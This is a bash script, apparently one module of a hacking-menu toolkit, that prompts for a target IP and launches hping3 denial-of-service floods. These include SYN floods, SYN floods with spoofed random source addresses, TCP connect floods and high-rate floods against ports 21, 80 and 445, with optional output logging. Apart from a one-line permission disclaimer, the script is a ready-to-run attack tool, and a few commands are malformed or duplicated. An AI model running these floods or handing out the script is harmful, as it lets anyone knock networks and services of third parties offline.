#!/bin/bash
clear
echo -e "\e[1;33m       Script Coded By =>   \033[5;37m \033[41m ♥ Vᵢₖₐₛ  Cₕₐᵤdₕₐᵣy ♥  \e[0m"
echo -e "\e[1;33m       Published By =>        \033[5;37m \033[44m   www.gkaim.com   \e[0m"
echo -e "\033[1;36m\033[3;36m Please use against target that you own or have permission to \e[0m"
echo
echo _____________-----------------------_________________
echo -e "                \033[1;32m\033[5;37m\033[41m HPING3 DOS/DDOS \e[0m""                 "
echo _____________-----------------------_________________
echo
echo " Your System must be Capable to use Hping3 otherwise please Go back ,Bcz it may Harm your System Very Badly"
echo 
read -p "Please enter the IP Address of the target: " I
echo
echo -e "\033[1;33m1.\033[1;31m DoS Using Simple SYN flood \e[0m"
echo -e "\033[1;33m2.\033[1;31m DoS Using SYN flood with Spoofed IP \e[0m"
echo -e "\033[1;33m3.\033[1;31m DoS Using TCP Connect Flood  \e[0m"
echo -e "\033[1;33m4.\033[1;31m DDOS Attacks 1 \e[0m"
echo -e "\033[1;33m5.\033[1;31m DDOS Attacks 2 \e[0m"
echo -e "\033[1;33m6.\033[1;31m Router DOS Attack 1 \e[0m"
echo -e "\033[1;33m7.\033[1;31m Router DOS Attack 2 \e[0m"
echo
echo -e "\033[1;33m0.\033[1;36m MAIN MENU \e[0m"
echo
read -p "Enter your choice: " ch
if [ $ch == 0 ]
then
cd ..
chmod + N-Reader.sh
./N-Reader.sh
fi
if [ $ch -le 7 ] 
then
echo -e "\e[1;33m1. Continue in the terminal \e[0m"
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
echo -e "\e[1;33m2. Save the output to a text file \e[0m"
read -p "Enter your opinion: " save
else
chmod +x N.sh
./N.sh
fi
if [ "$save" == 2 ]; then 
read -p "Please specify the full path along with the file name(add .txt at the end of file name)" path
if [ $ch == 1 ]
then
hping3 -S --flood -V $I > $path
elif [ $ch == 2 ]
then
hping3 -S -P -U --flood -V --rand-source $I > $path
elif [ $ch == 3 ]
then
hping3 --tcp-connect -rate=90000 -c 900000 -q $I > $path
elif [ $ch == 4 ]
then
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $I > $path
elif [ $ch == 5 ]
then
hping3 -i u1 -S -p80 $I --rand-source > $path
elif [ $ch == 6 ]
then
hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $I > $path
elif [ $ch == 7 ]
then
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $I > $path
fi
echo -e "\e[1;33mAll the output has been saved to: $path \e[0m"
elif [ "$save" == 1 ]; then
if [ $ch == 1 ]
then
hping3 -S --flood -V $I
elif [ $ch == 2 ]
then
hping3 -S -P -U --flood -V --rand-source $I
elif [ $ch == 3 ]
then
hping3 --tcp-connect -rate=90000 -c 900000 -q $I
elif [ $ch == 4 ]
then
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $I
elif [ $ch == 5 ]
then
hping3 -i u1 -S -p80 $I --rand-source
elif [ $ch == 6 ]
then
hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $I
elif [ $ch == 7 ]
then
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $I
fi
else
chmod +x N.sh
./N.sh
fi
echo 
echo -e '\033[4;32m''\033[7;34m'"I Hope You Enjoying Me, Thanks For Using me\e[0m"' \033[1;32m'
read -p "             To run another scan Hit Enter"
./Hd.sh

